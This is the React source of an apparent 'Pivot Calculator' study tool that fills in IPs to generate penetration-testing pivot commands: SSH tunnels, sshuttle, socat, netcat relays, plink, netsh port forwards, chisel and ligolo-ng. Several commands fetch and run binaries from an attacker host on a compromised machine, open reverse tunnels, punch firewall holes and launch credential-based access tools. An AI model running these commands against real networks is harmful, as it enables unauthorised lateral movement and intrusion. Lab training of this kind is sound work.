import { useState } from "react";

const methods = [
  { id: "ssh_local", label: "SSH Local (-L)" },
  { id: "ssh_dynamic", label: "SSH Dynamic SOCKS (-D)" },
  { id: "ssh_remote", label: "SSH Remote (-R)" },
  { id: "ssh_remote_dynamic", label: "SSH Remote Dynamic" },
  { id: "sshuttle", label: "sshuttle (VPN-like)" },
  { id: "socat", label: "Socat" },
  { id: "nc_fifo", label: "Netcat + FIFO" },
  { id: "plink", label: "Plink (Windows)" },
  { id: "netsh", label: "Netsh (Windows)" },
  { id: "ssh_exe", label: "ssh.exe (Windows)" },
  { id: "chisel_server", label: "Chisel" },
  { id: "ligolo", label: "Ligolo-ng" },
];

const protocols = [
  { id: "smb", label: "SMB", port: "445", tools: "smbclient -p {lport} //{host}/ -U {user} --password={pass}\ncrackmapexec smb {host} -p {lport} -u {user} -p {pass}" },
  { id: "ssh", label: "SSH", port: "22", tools: "ssh {user}@{host} -p {lport}" },
  { id: "rdp", label: "RDP", port: "3389", tools: "xfreerdp /u:{user} /p:{pass} /v:{host}:{lport}" },
  { id: "http", label: "HTTP", port: "80", tools: "curl http://{host}:{lport}\nferoxbuster -u http://{host}:{lport}" },
  { id: "postgres", label: "PostgreSQL", port: "5432", tools: "psql -h {host} -p {lport} -U postgres" },
  { id: "mysql", label: "MySQL", port: "3306", tools: "mysql -h {host} -P {lport} -u root -p" },
  { id: "winrm", label: "WinRM", port: "5985", tools: "evil-winrm -i {host} -P {lport} -u {user} -p {pass}" },
  { id: "custom", label: "Custom", port: "", tools: "" },
];

const usesSocks = (m) => ["ssh_dynamic","ssh_remote_dynamic","ssh_exe","chisel_server"].includes(m);
const isRemote = (m) => ["ssh_remote","ssh_remote_dynamic","plink","ssh_exe"].includes(m);

function CopyBtn({ text, label }) {
  const [ok, setOk] = useState(false);
  return (
    <button className={`cbtn${ok?" copied":""}`} onClick={() => { navigator.clipboard.writeText(text); setOk(true); setTimeout(()=>setOk(false),1500); }}>
      {ok ? "✓" : (label || "⎘")}
    </button>
  );
}

function ObsBtn({ blocks }) {
  const [ok, setOk] = useState(false);
  const handle = () => {
    const md = blocks.filter(b=>b.cmd).map(b =>
      `## ${b.label}\n\`\`\`bash\n${b.cmd}\n\`\`\`${b.note?`\n> ${b.note}`:""}`
    ).join("\n\n");
    navigator.clipboard.writeText(md);
    setOk(true); setTimeout(()=>setOk(false),1800);
  };
  return <button className={`obtn${ok?" copied":""}`} onClick={handle}>{ok?"✓ Copied":"⬡ Copy All (Obsidian MD)"}</button>;
}

function CmdBlock({ label, cmd, note, verify }) {
  if (!cmd) return null;
  return (
    <div className="cblock">
      <div className="cheader">
        <span className="clabel">{label}</span>
        <CopyBtn text={cmd} />
      </div>
      <pre className="ctext">{cmd}</pre>
      {note && <div className="cnote">💡 {note}</div>}
      {verify && (
        <div className="cverify">
          <span className="vlabel">✓ verify</span>
          <pre className="vtext">{verify}</pre>
          <CopyBtn text={verify} label="⎘" />
        </div>
      )}
    </div>
  );
}

function gen(method, f) {
  const p = {
    kali: f.kaliIp||"<kali_ip>", pivotExt: f.pivotExtIp||"<pivot_ext>",
    pivotInt: f.pivotIntIp||"<pivot_int>", user: f.pivotUser||"user",
    pass: f.pivotPass||"<pass>", target: f.targetIp||"<target>",
    tp: f.targetPort||"<port>", lp: f.listenPort||"4455",
    sp: f.socksPort||"9999", h2: f.hop2Ip||"<hop2>",
    h2p: f.hop2Port||"22", h2u: f.hop2User||"user", h2lp: f.hop2ListenPort||"4466",
  };
  const hasH2 = f.hop2Ip && f.hop2Ip.length > 3;
  const h2block = hasH2 ? {
    label: "▶ Double pivot — second hop",
    cmd: `# On pivot1 — forward to pivot2 then target:\nssh -N -L 0.0.0.0:${p.h2lp}:${p.target}:${p.tp} ${p.h2u}@${p.h2}\n\n# Chain: Kali → ${p.pivotExt}:${p.lp} → ${p.h2} → ${p.target}:${p.tp}`,
    note: `Double pivot via ${p.h2}`,
    verify: `ss -ntlp | grep ${p.h2lp}`,
  } : null;

  switch(method) {
    case "ssh_local": return [
      { label:"▶ On pivot host — start tunnel", cmd:`ssh -N -L 0.0.0.0:${p.lp}:${p.target}:${p.tp} ${p.user}@${p.pivotInt}`, note:"-N = no output is normal", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ Confirm from Kali", cmd:`nc -zv ${p.pivotExt} ${p.lp} && echo "TUNNEL UP"`, verify:`nc -zv ${p.pivotExt} ${p.lp}` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_dynamic": return [
      { label:"▶ On pivot host — open SOCKS proxy", cmd:`ssh -N -D 0.0.0.0:${p.sp} ${p.user}@${p.pivotInt}`, note:"Creates SOCKS proxy on pivot external interface", verify:`ss -ntlp | grep ${p.sp}` },
      { label:"▶ Test from Kali (after proxychains config)", cmd:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_remote": return [
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh\nsudo ss -ntlp | grep 22`, note:"Set PasswordAuthentication yes in /etc/ssh/sshd_config if needed" },
      { label:"▶ On pivot host — connect back to Kali", cmd:`ssh -N -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} kali@${p.kali}`, note:"Firewall blocks inbound? Pivot connects OUT to Kali", verify:`# On Kali:\nss -ntlp | grep ${p.lp}` },
      { label:"▶ From Kali — connect on localhost", cmd:`psql -h 127.0.0.1 -p ${p.lp} -U postgres\nssh user@127.0.0.1 -p ${p.lp}`, verify:`nc -zv 127.0.0.1 ${p.lp} && echo "UP"` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_remote_dynamic": return [
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh` },
      { label:"▶ On pivot — reverse SOCKS to Kali", cmd:`ssh -N -R ${p.sp} kali@${p.kali}`, note:"SOCKS proxy on Kali localhost — pivot connects out", verify:`# On Kali:\nss -ntlp | grep ${p.sp}` },
      { label:"▶ From Kali — use proxychains", cmd:`proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains smbclient -L //${p.target}/ -U ${p.user}`, verify:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
      ...(h2block?[h2block]:[]),
    ];
    case "sshuttle": {
      const sn = f.targetIp ? f.targetIp.split('.').slice(0,3).join('.')+'.0/24' : '172.16.50.0/24';
      return [
        { label:"▶ Optional — socat to reach SSH (if no direct access)", cmd:`socat TCP-LISTEN:2222,fork TCP:${p.pivotInt}:22\n# Skip if you can SSH directly to pivot` },
        { label:"▶ On Kali — run sshuttle (sudo required)", cmd:`sshuttle -r ${p.user}@${p.pivotExt}:2222 ${sn}\n# Multiple subnets:\nsshuttle -r ${p.user}@${p.pivotExt}:2222 10.4.50.0/24 172.16.50.0/24`, note:"Root on Kali + Python3 on pivot required. No proxychains needed after.", verify:`nc -zv ${p.target} ${p.tp} && echo "ROUTED OK"` },
        { label:"▶ From Kali — direct access, no proxychains", cmd:`nmap -sT -Pn ${p.target}\nsmbclient -L //${p.target}/ -U ${p.user} --password=${p.pass}` },
        { label:"▶ Cleanup", cmd:`# Ctrl+C in sshuttle terminal — routes removed automatically` },
      ];
    }
    case "socat": return [
      { label:"▶ On pivot host — start forwarder", cmd:`socat -ddd TCP-LISTEN:${p.lp},fork TCP:${p.target}:${p.tp}`, note:"-ddd = verbose. Kill with: kill $(pgrep socat)", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ Confirm from Kali", cmd:`nc -zv ${p.pivotExt} ${p.lp} && echo "SOCAT UP"` },
      { label:"▶ Cleanup", cmd:`kill $(pgrep socat)` },
      ...(h2block?[h2block]:[]),
    ];
    case "nc_fifo": return [
      { label:"▶ On pivot — nc + fifo", cmd:`mkfifo /tmp/pivot_pipe\nnc -lnvp ${p.lp} < /tmp/pivot_pipe | nc ${p.target} ${p.tp} > /tmp/pivot_pipe`, note:"Single connection only — restart for each new connection", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ From Kali", cmd:`nc ${p.pivotExt} ${p.lp}` },
    ];
    case "plink": return [
      { label:"▶ On Kali — serve plink + start SSH", cmd:`sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/\nsudo systemctl start apache2\nsudo systemctl start ssh` },
      { label:"▶ On Windows — download plink", cmd:`powershell wget -Uri http://${p.kali}/plink.exe -OutFile C:\\Windows\\Temp\\plink.exe` },
      { label:"▶ On Windows — remote port forward", cmd:`C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <kali_password> -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} ${p.kali}`, note:"Password on command line — risky. Plink does NOT support -D dynamic.", verify:`# On Kali:\nss -ntlp | grep ${p.lp}` },
      { label:"▶ Non-TTY shell — pipe y for host key", cmd:`cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <pass> -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} ${p.kali}` },
      { label:"▶ From Kali — connect on localhost", cmd:`psql -h 127.0.0.1 -p ${p.lp} -U postgres\nssh user@127.0.0.1 -p ${p.lp}`, verify:`nc -zv 127.0.0.1 ${p.lp} && echo "UP"` },
    ];
    case "netsh": return [
      { label:"▶ On Windows (admin) — create port forward", cmd:`netsh interface portproxy add v4tov4 listenport=${p.lp} listenaddress=${p.pivotExt} connectport=${p.tp} connectaddress=${p.target}`, verify:`netsh interface portproxy show all\nnetstat -anp TCP | find "${p.lp}"` },
      { label:"▶ Open firewall hole (required — filtered without this)", cmd:`netsh advfirewall firewall add rule name="pf_${p.lp}" protocol=TCP dir=in localip=${p.pivotExt} localport=${p.lp} action=allow`, note:"Port shows as filtered from Kali without this rule", verify:`# From Kali:\nnmap -sS ${p.pivotExt} -Pn -n -p${p.lp}` },
      { label:"▶ From Kali — connect through forward", cmd:`ssh ${p.user}@${p.pivotExt} -p ${p.lp}\npsql -h ${p.pivotExt} -p ${p.lp} -U postgres`, verify:`nc -zv ${p.pivotExt} ${p.lp} && echo "UP"` },
      { label:"▶ CLEANUP — always delete when done", cmd:`netsh advfirewall firewall delete rule name="pf_${p.lp}"\nnetsh interface portproxy del v4tov4 listenport=${p.lp} listenaddress=${p.pivotExt}` },
    ];
    case "ssh_exe": return [
      { label:"▶ Verify ssh.exe version", cmd:`where ssh\nssh.exe -V\n# Needs >= 7.6 for remote dynamic` },
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh`, note:"Set PasswordAuthentication yes in sshd_config if needed" },
      { label:"▶ On Windows — remote dynamic SOCKS", cmd:`ssh -N -R ${p.sp} kali@${p.kali}`, note:"Creates SOCKS proxy on Kali localhost", verify:`# On Kali:\nss -ntlp | grep ${p.sp}` },
      { label:"▶ From Kali — use proxychains", cmd:`proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains psql -h ${p.target} -U postgres`, verify:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
    ];
    case "chisel_server": return [
      { label:"▶ On Kali — start chisel server", cmd:`./chisel server -p 8080 --reverse --socks5`, verify:`ss -ntlp | grep 8080` },
      { label:"▶ Transfer chisel to pivot", cmd:`python3 -m http.server 80\n# On pivot:\nwget http://${p.kali}/chisel -O /tmp/chisel && chmod +x /tmp/chisel` },
      { label:"▶ On pivot — connect to Kali", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks`, note:"Creates SOCKS proxy on Kali port 1080", verify:`# On Kali:\nss -ntlp | grep 1080` },
      { label:"▶ Single port (no SOCKS)", cmd:`/tmp/chisel client ${p.kali}:8080 R:${p.lp}:${p.target}:${p.tp}` },
      ...(h2block?[h2block]:[]),
    ];
    case "ligolo": return [
      { label:"▶ On Kali — setup tun + start proxy", cmd:`sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601`, verify:`ip link show ligolo` },
      { label:"▶ Transfer agent to pivot", cmd:`python3 -m http.server 80\n# On pivot:\nwget http://${p.kali}/agent -O /tmp/agent && chmod +x /tmp/agent` },
      { label:"▶ On pivot — connect agent", cmd:`/tmp/agent -connect ${p.kali}:11601 -ignore-cert` },
      { label:"▶ In ligolo console", cmd:`session\n# select session number\nstart` },
      { label:"▶ On Kali — add route", cmd:`sudo ip route add ${f.targetIp?f.targetIp.split('.').slice(0,3).join('.')+'.0/24':'172.16.50.0/24'} dev ligolo`, verify:`ip route | grep ligolo` },
      { label:"▶ From Kali — direct access (no proxychains)", cmd:`nmap -sT -Pn ${p.target}\nsmbclient -L //${p.target}/ -U ${p.user}\npsql -h ${p.target} -p ${p.tp} -U postgres`, note:"Fastest — routes natively", verify:`ping -c1 ${p.target} && echo "ROUTE OK"` },
      ...(h2block?[h2block]:[]),
    ];
    default: return [];
  }
}

export default function PivotCalc() {
  const [method, setMethod] = useState("ssh_local");
  const [proto, setProto] = useState("smb");
  const [showH2, setShowH2] = useState(false);
  const [f, setF] = useState({
    kaliIp:"", pivotExtIp:"", pivotIntIp:"", pivotUser:"database_admin", pivotPass:"",
    targetIp:"", targetPort:"445", listenPort:"4455", socksPort:"9999",
    hop2Ip:"", hop2Port:"22", hop2User:"user", hop2ListenPort:"4466",
  });
  const set = k => e => setF(v=>({...v,[k]:e.target.value}));
  const handleProto = (id, port) => { setProto(id); if(port) setF(v=>({...v,targetPort:port})); };

  const cmds = gen(method, f);
  const socks = usesSocks(method);
  const remote = isRemote(method);
  const selProto = protocols.find(p=>p.id===proto);
  const pcHost = remote ? "127.0.0.1" : (f.pivotExtIp||"<pivot_ext>");
  const toolHost = socks ? (remote?"127.0.0.1":f.pivotExtIp||"<pivot>") : (f.pivotExtIp||"<pivot>");

  const toolsRaw = selProto?.tools
    ?.replace(/{host}/g, toolHost)
    ?.replace(/{lport}/g, f.listenPort||"4455")
    ?.replace(/{user}/g, f.pivotUser||"user")
    ?.replace(/{pass}/g, f.pivotPass||"<pass>");
  const tools = socks && toolsRaw ? toolsRaw.split('\n').map(l=>`proxychains ${l}`).join('\n') : toolsRaw;

  const pcConf = `# /etc/proxychains4.conf — replace [ProxyList] at bottom:\nsocks5 ${pcHost} ${f.socksPort||"9999"}\n\n# Speed up nmap scans:\ntcp_read_time_out 800\ntcp_connect_time_out 700`;

  const diagNodes = [
    {label:"Kali", ip:f.kaliIp||"?.?.?.?", color:"#4ade80"},
    {label:"Pivot", ip:f.pivotExtIp||"?.?.?.?", color:"#facc15"},
    ...(showH2&&f.hop2Ip?[{label:"Pivot 2",ip:f.hop2Ip,color:"#f97316"}]:[]),
    {label:"Target", ip:f.targetIp||"?.?.?.?", color:"#f87171"},
  ];

  return (
    <div className="r">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap');
        *{box-sizing:border-box;margin:0;padding:0}
        .r{min-height:100vh;background:#080b12;color:#c8d6e5;font-family:'JetBrains Mono',monospace;padding:2rem 1rem}
        .hdr{max-width:960px;margin:0 auto 1.5rem;border-bottom:1px solid #1e2d40;padding-bottom:1.25rem}
        .back{display:inline-block;margin-bottom:.75rem;color:#4a5568;font-size:.72rem;text-decoration:none}
        .back:hover{color:#4ade80}
        .title{font-family:'Syne',sans-serif;font-size:1.9rem;font-weight:800;color:#4ade80;letter-spacing:-.02em}
        .sub{font-size:.7rem;color:#4a5568;margin-top:.2rem;text-transform:uppercase;letter-spacing:.1em}
        .body{max-width:960px;margin:0 auto;display:grid;gap:1.1rem}
        .diag{background:#0d1520;border:1px solid #1e2d40;border-radius:8px;padding:1.1rem;display:flex;align-items:center;overflow-x:auto;gap:0}
        .dn{display:flex;flex-direction:column;align-items:center;min-width:100px}
        .db{border:1px solid;border-radius:5px;padding:.45rem .65rem;font-size:.62rem;text-align:center;width:100%}
        .dl{font-weight:700;font-size:.58rem;text-transform:uppercase;letter-spacing:.08em;margin-bottom:.12rem}
        .dip{font-size:.58rem;opacity:.7}
        .darr{flex:1;min-width:45px;display:flex;flex-direction:column;align-items:center;gap:2px}
        .dline{height:2px;width:100%;background:linear-gradient(90deg,#1e3a5f,#2d5a8e,#1e3a5f)}
        .dport{font-size:.52rem;color:#4a90d9}
        .sec{background:#0d1520;border:1px solid #1e2d40;border-radius:8px;padding:1.1rem}
        .stitle{font-size:.6rem;text-transform:uppercase;letter-spacing:.12em;color:#4a5568;margin-bottom:.9rem;padding-bottom:.45rem;border-bottom:1px solid #1a2535;display:flex;justify-content:space-between;align-items:center}
        .mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.35rem}
        .mbtn{background:#0a1018;border:1px solid #1e2d40;border-radius:5px;padding:.5rem .65rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.65rem;cursor:pointer;text-align:left;transition:all .12s}
        .mbtn:hover{border-color:#2d4a6b;color:#7a9bbf}
        .mbtn.active{border-color:#4ade80;color:#4ade80;background:#0d1f10}
        .pgrid{display:flex;flex-wrap:wrap;gap:.3rem}
        .pbtn{background:#0a1018;border:1px solid #1e2d40;border-radius:4px;padding:.25rem .5rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.6rem;cursor:pointer;transition:all .12s}
        .pbtn:hover{border-color:#2d4a6b;color:#7a9bbf}
        .pbtn.active{border-color:#facc15;color:#facc15;background:#1a1500}
        .igrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:.6rem}
        .fld{display:flex;flex-direction:column;gap:.22rem}
        .fld label{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:#4a5568}
        .fld input{background:#0a1018;border:1px solid #1e2d40;border-radius:4px;padding:.4rem .5rem;color:#c8d6e5;font-family:'JetBrains Mono',monospace;font-size:.7rem;outline:none;transition:border-color .12s;width:100%}
        .fld input:focus{border-color:#4ade80}
        .fld input::placeholder{color:#2d4a6b}
        .h2btn{background:none;border:1px solid #1e2d40;border-radius:4px;padding:.25rem .6rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.6rem;cursor:pointer;transition:all .12s}
        .h2btn:hover,.h2btn.active{border-color:#f97316;color:#f97316;background:#1a0a00}
        .h2sec{margin-top:.7rem;padding-top:.7rem;border-top:1px solid #1a2535}
        .h2lbl{font-size:.56rem;color:#f97316;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem}
        .carea{display:flex;flex-direction:column;gap:.6rem}
        .cblock{background:#060a10;border:1px solid #1a2535;border-radius:6px;overflow:hidden}
        .pc-block{border-color:#1e3a5f}
        .tl-block{border-color:#1a2d1a}
        .cheader{display:flex;justify-content:space-between;align-items:center;padding:.32rem .65rem;background:#0a1520;border-bottom:1px solid #1a2535}
        .clabel{font-size:.6rem;color:#4a90d9;letter-spacing:.04em}
        .tl-block .clabel{color:#4ade80}
        .pc-block .clabel{color:#60a5fa}
        .cbtn{background:none;border:1px solid #1e2d40;border-radius:3px;color:#4a5568;font-size:.62rem;padding:.1rem .35rem;cursor:pointer;transition:all .12s;font-family:inherit;white-space:nowrap}
        .cbtn:hover,.cbtn.copied{border-color:#4ade80;color:#4ade80}
        .obtn{background:#0a1018;border:1px solid #7c3aed;border-radius:5px;color:#a78bfa;font-family:'JetBrains Mono',monospace;font-size:.62rem;padding:.35rem .7rem;cursor:pointer;transition:all .12s}
        .obtn:hover{background:#1a0a2e}
        .obtn.copied{border-color:#4ade80;color:#4ade80}
        .ctext{padding:.65rem;font-size:.68rem;line-height:1.65;color:#a0c4e8;white-space:pre-wrap;word-break:break-all}
        .cnote{padding:.3rem .65rem;font-size:.58rem;color:#4a6580;border-top:1px solid #1a2535}
        .cverify{padding:.35rem .65rem;background:#0a1810;border-top:1px solid #1a2d1a;display:flex;align-items:flex-start;gap:.45rem}
        .vlabel{font-size:.52rem;color:#4ade80;text-transform:uppercase;letter-spacing:.08em;white-space:nowrap;padding-top:.08rem}
        .vtext{font-size:.62rem;color:#6eca8a;flex:1;white-space:pre-wrap;word-break:break-all}
        .empty{text-align:center;padding:2rem;color:#2d4a6b;font-size:.72rem}
        .chwrap{display:flex;justify-content:space-between;align-items:center;width:100%}
      `}</style>

      <div className="hdr">
        <a href="/" className="back">← The Path</a>
        <div className="title">Pivot Calculator</div>
        <div className="sub">Fill in your IPs → get exact commands</div>
      </div>

      <div className="body">

        {/* DIAGRAM */}
        <div className="diag">
          {diagNodes.map((node,i,arr) => (
            <div key={node.label} style={{display:"contents"}}>
              <div className="dn">
                <div className="db" style={{borderColor:node.color,color:node.color}}>
                  <div className="dl">{node.label}</div>
                  <div className="dip">{node.ip}</div>
                </div>
              </div>
              {i<arr.length-1 && (
                <div className="darr">
                  <div className="dline"/>
                  <div className="dport">{i===0?`:${f.listenPort||f.socksPort||"..."}`:`:${f.targetPort||"..."}`}</div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* METHOD */}
        <div className="sec">
          <div className="stitle">01 — Method</div>
          <div className="mgrid">
            {methods.map(m=>(
              <button key={m.id} className={`mbtn${method===m.id?" active":""}`} onClick={()=>setMethod(m.id)}>{m.label}</button>
            ))}
          </div>
        </div>

        {/* PROTOCOL */}
        <div className="sec">
          <div className="stitle">02 — Target Protocol</div>
          <div className="pgrid">
            {protocols.map(p=>(
              <button key={p.id} className={`pbtn${proto===p.id?" active":""}`} onClick={()=>handleProto(p.id,p.port)}>
                {p.label}{p.port?` (${p.port})`:""}
              </button>
            ))}
          </div>
        </div>

        {/* INPUTS */}
        <div className="sec">
          <div className="stitle">
            <span>03 — Your Network</span>
            <button className={`h2btn${showH2?" active":""}`} onClick={()=>setShowH2(v=>!v)}>
              {showH2?"− Remove second hop":"+ Add second hop"}
            </button>
          </div>
          <div className="igrid">
            {[
              ["kaliIp","Kali IP (tun0)","192.168.45.210"],
              ["pivotExtIp","Pivot External IP","192.168.50.63"],
              ["pivotIntIp","Pivot Internal IP","10.4.50.63"],
              ["pivotUser","Pivot User","database_admin"],
              ["pivotPass","Pivot Password",""],
              ["targetIp","Target (Internal) IP","172.16.50.217"],
              ["targetPort","Target Port","445"],
              ["listenPort","Local Listen Port","4455"],
              ["socksPort","SOCKS Port","9999"],
            ].map(([k,label,ph])=>(
              <div key={k} className="fld">
                <label>{label}</label>
                <input value={f[k]} onChange={set(k)} placeholder={ph} type={k==="pivotPass"?"password":"text"} />
              </div>
            ))}
          </div>
          {showH2 && (
            <div className="h2sec">
              <div className="h2lbl">⬡ Second Hop — Double Pivot</div>
              <div className="igrid">
                {[
                  ["hop2Ip","Pivot 2 IP","172.16.50.100"],
                  ["hop2Port","Pivot 2 SSH Port","22"],
                  ["hop2User","Pivot 2 User","user"],
                  ["hop2ListenPort","Second Listen Port","4466"],
                ].map(([k,label,ph])=>(
                  <div key={k} className="fld">
                    <label>{label}</label>
                    <input value={f[k]} onChange={set(k)} placeholder={ph} />
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* COMMANDS */}
        <div className="sec">
          <div className="stitle">
            <div className="chwrap">
              <span>04 — Generated Commands</span>
              {cmds.length>0 && <ObsBtn blocks={cmds} />}
            </div>
          </div>
          {cmds.length===0 ? (
            <div className="empty">Select a method above</div>
          ) : (
            <div className="carea">
              {cmds.map((c,i)=>(
                <div key={i} className="cblock">
                  <div className="cheader">
                    <span className="clabel">{c.label}</span>
                    <CopyBtn text={c.cmd} />
                  </div>
                  <pre className="ctext">{c.cmd}</pre>
                  {c.note && <div className="cnote">💡 {c.note}</div>}
                  {c.verify && (
                    <div className="cverify">
                      <span className="vlabel">✓ verify</span>
                      <pre className="vtext">{c.verify}</pre>
                      <CopyBtn text={c.verify} label="⎘" />
                    </div>
                  )}
                </div>
              ))}

              {/* Auto proxychains config */}
              {socks && (
                <div className="cblock pc-block">
                  <div className="cheader">
                    <span className="clabel">▶ /etc/proxychains4.conf — auto-generated</span>
                    <CopyBtn text={pcConf} />
                  </div>
                  <pre className="ctext">{pcConf}</pre>
                  <div className="cnote">💡 Replace the [ProxyList] section at the bottom of the file</div>
                </div>
              )}

              {/* Tool suggestions */}
              {tools && proto!=="custom" && (
                <div className="cblock tl-block">
                  <div className="cheader">
                    <span className="clabel">▶ Tools to run — {selProto?.label} :{f.targetPort||selProto?.port}</span>
                    <CopyBtn text={tools} />
                  </div>
                  <pre className="ctext">{tools}</pre>
                </div>
              )}
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
